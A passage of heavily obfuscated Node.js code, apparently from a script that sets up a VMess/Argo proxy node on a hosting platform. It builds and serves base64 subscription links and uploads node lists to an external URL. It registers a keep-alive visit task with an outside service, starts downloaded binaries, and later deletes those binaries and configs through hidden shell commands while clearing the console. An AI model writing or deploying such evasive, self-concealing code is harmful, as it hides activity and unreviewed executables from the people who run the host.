_0x181953=await _0x20fa80(),_0x48ed9b=NAME?NAME+'-'+_0x181953:_0x181953;return new Promise(_0x19b341=>{const _0x4e4e47={_0x314021:0x18a,_0x56d4a7:0x104,_0x5cc182:0x11d,_0x1d6767:0x154,_0x2c7499:0x18b,_0x11c411:0x12f,_0x2faf3a:0x109,_0x536907:0xfa,_0x5a9e20:0x143,_0x164ea6:0x13c,_0x133ed4:0x178,_0x1e0799:0x16d,_0x23486d:0x137},_0x1eddcb={_0x5ebf7b:0x12f,_0x42be28:0x109,_0x41b5e6:0x107,_0xd25595:0x113};setTimeout(()=>{const _0x27c382=_0x1e61,_0x408840={'v':'2','ps':''+_0x48ed9b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x27c382(0x15a),'net':'ws','type':_0x27c382(0x15a),'host':_0x4b8312,'path':'/vmess-argo?ed=2560','tls':_0x27c382(_0x4e4e47._0x314021),'sni':_0x4b8312,'alpn':'','fp':_0x27c382(0x158)},_0x328a8d=_0x27c382(_0x4e4e47._0x56d4a7)+UUID+'@'+CFIP+':'+CFPORT+_0x27c382(_0x4e4e47._0x5cc182)+_0x4b8312+_0x27c382(0x13c)+_0x4b8312+_0x27c382(_0x4e4e47._0x1d6767)+_0x48ed9b+_0x27c382(_0x4e4e47._0x2c7499)+Buffer[_0x27c382(_0x4e4e47._0x11c411)](JSON['stringify'](_0x408840))[_0x27c382(_0x4e4e47._0x2faf3a)](_0x27c382(0x137))+_0x27c382(_0x4e4e47._0x536907)+UUID+'@'+CFIP+':'+CFPORT+_0x27c382(_0x4e4e47._0x5a9e20)+_0x4b8312+_0x27c382(_0x4e4e47._0x164ea6)+_0x4b8312+_0x27c382(_0x4e4e47._0x133ed4)+_0x48ed9b+_0x27c382(_0x4e4e47._0x1e0799);console[_0x27c382(0x174)](Buffer[_0x27c382(0x12f)](_0x328a8d)['toString']('base64')),fs[_0x27c382(0x184)](subPath,Buffer[_0x27c382(0x12f)](_0x328a8d)[_0x27c382(_0x4e4e47._0x2faf3a)](_0x27c382(_0x4e4e47._0x23486d))),console[_0x27c382(0x174)](FILE_PATH+_0x27c382(0xe4)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x1e7137,_0x1a19b8)=>{const _0x5314e3=_0x27c382,_0x24599f=Buffer[_0x5314e3(_0x1eddcb._0x5ebf7b)](_0x328a8d)[_0x5314e3(_0x1eddcb._0x42be28)](_0x5314e3(0x137));_0x1a19b8[_0x5314e3(0xe5)](_0x5314e3(_0x1eddcb._0x41b5e6),'text/plain;\x20charset=utf-8'),_0x1a19b8[_0x5314e3(_0x1eddcb._0xd25595)](_0x24599f);}),_0x19b341(_0x328a8d);},0x7d0);});}}async function uploadNodes(){const _0xd12002={_0x30f9f2:0x139,_0x15ceaa:0x19a,_0x441b85:0x149,_0x33779e:0x11c,_0x12e3e7:0x155,_0x3e3f81:0x17a,_0x57f9f6:0x142,_0x187406:0x174},_0x53b1c9=_0x249e7e;if(UPLOAD_URL&&PROJECT_URL){const _0x508c4f=PROJECT_URL+'/'+SUB_PATH,_0x35faa4={'subscription':[_0x508c4f]};try{const _0x32f995=await axios[_0x53b1c9(0x17a)](UPLOAD_URL+_0x53b1c9(_0xd12002._0x30f9f2),_0x35faa4,{'headers':{'Content-Type':_0x53b1c9(_0xd12002._0x15ceaa)}});return _0x32f995&&_0x32f995[_0x53b1c9(0xfe)]===0xc8?(console['log'](_0x53b1c9(0x19c)),_0x32f995):null;}catch(_0x3c89bb){if(_0x3c89bb['response']){if(_0x3c89bb[_0x53b1c9(0xe7)][_0x53b1c9(0xfe)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x53b1c9(0x16b)](listPath))return;const _0x3cdb97=fs[_0x53b1c9(_0xd12002._0x441b85)](listPath,_0x53b1c9(_0xd12002._0x33779e)),_0x2c5642=_0x3cdb97[_0x53b1c9(0x16e)]('\x0a')[_0x53b1c9(_0xd12002._0x12e3e7)](_0x23a6c4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x53b1c9(0x156)](_0x23a6c4));if(_0x2c5642[_0x53b1c9(0x120)]===0x0)return;const _0xbc83d3=JSON['stringify']({'nodes':_0x2c5642});try{const _0x54b7de=await axios[_0x53b1c9(_0xd12002._0x3e3f81)](UPLOAD_URL+_0x53b1c9(_0xd12002._0x57f9f6),_0xbc83d3,{'headers':{'Content-Type':_0x53b1c9(0x19a)}});return _0x54b7de&&_0x54b7de[_0x53b1c9(0xfe)]===0xc8?(console[_0x53b1c9(_0xd12002._0x187406)](_0x53b1c9(0x12e)),_0x54b7de):null;}catch(_0x5bcd10){return null;}}else return;}}function cleanFiles(){const _0x3fa278={_0x1dfc47:0x168,_0x4b231c:0xf6,_0x435158:0x111,_0x42ee46:0xef,_0x1384f9:0xfb,_0x5f032b:0x165};setTimeout(()=>{const _0x4645b5={_0x34f03a:0x174,_0x3c282a:0x13b,_0x178f48:0x174,_0x3938:0x15c},_0xd18a46={_0x178530:0x187,_0x512dde:0x13b,_0x33eb60:0x15c},_0x301ba8=_0x1e61,_0x31eb5c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x31eb5c[_0x301ba8(_0x3fa278._0x1dfc47)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x31eb5c[_0x301ba8(_0x3fa278._0x1dfc47)](phpPath);process[_0x301ba8(_0x3fa278._0x4b231c)]===_0x301ba8(_0x3fa278._0x435158)?exec(_0x301ba8(0xd8)+_0x31eb5c[_0x301ba8(0xfb)]('\x20')+_0x301ba8(_0x3fa278._0x42ee46),_0xae4f50=>{const _0x45c7aa=_0x301ba8;console[_0x45c7aa(_0xd18a46._0x178530)](),console[_0x45c7aa(0x174)](_0x45c7aa(_0xd18a46._0x512dde)),console['log'](_0x45c7aa(_0xd18a46._0x33eb60));}):exec(_0x301ba8(0x15f)+_0x31eb5c[_0x301ba8(_0x3fa278._0x1384f9)]('\x20')+_0x301ba8(_0x3fa278._0x5f032b),_0x4226f2=>{const _0x3a61b0=_0x301ba8;console['clear'](),console[_0x3a61b0(_0x4645b5._0x34f03a)](_0x3a61b0(_0x4645b5._0x3c282a)),console[_0x3a61b0(_0x4645b5._0x178f48)](_0x3a61b0(_0x4645b5._0x3938));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x180a6d={_0x9be3a0:0x17a,_0x2b7af8:0x19a},_0x51917e=_0x249e7e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x51917e(0x174)](_0x51917e(0x145));return;}try{const _0x11a9f6=await axios[_0x51917e(_0x180a6d._0x9be3a0)](_0x51917e(0x141),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x51917e(_0x180a6d._0x2b7af8)}});return console[_0x51917e(0x174)]('automatic\x20access\x20task\x20added\x20successfully'),_0x11a9f6;}catch(_0x100b78){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x100b78['message']),null;}}function _0x1e61(_0x419d7d,_0x2011bb){const _0x2d3b67=_0x2d3b();return _0x1e61=function(_0x1e6187,_0xee4de8){_0x1e6187=_0x1e6187-0xd8;let _0x49092b=_0x2d3b67[_0x1e6187];return _0x49092b;},_0x1e61(_0x419d7d,_0x2011bb);}async function startserver(){const _0x3c0cfd=_0x249e7e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x213767){console[_0x3c0cfd(0x10e)]('Error\x20in\x20startserver:',_0x213767);}}startserver()[_0x249e7e(0x152)](_0x27dc37=>{const _0x676735={_0x2f0c83:0x190},_0x1dcc32=_0x249e7e;console[_0x1dcc32(0x10e)](_0x1dcc32(_0x676735._0x2f0c83),_0x27dc37);}),app[_0x249e7e(0x172)](PORT,()=>console[_0x249e7e(0x174)](_0x249e7e(0xdb)+PORT+'!'));
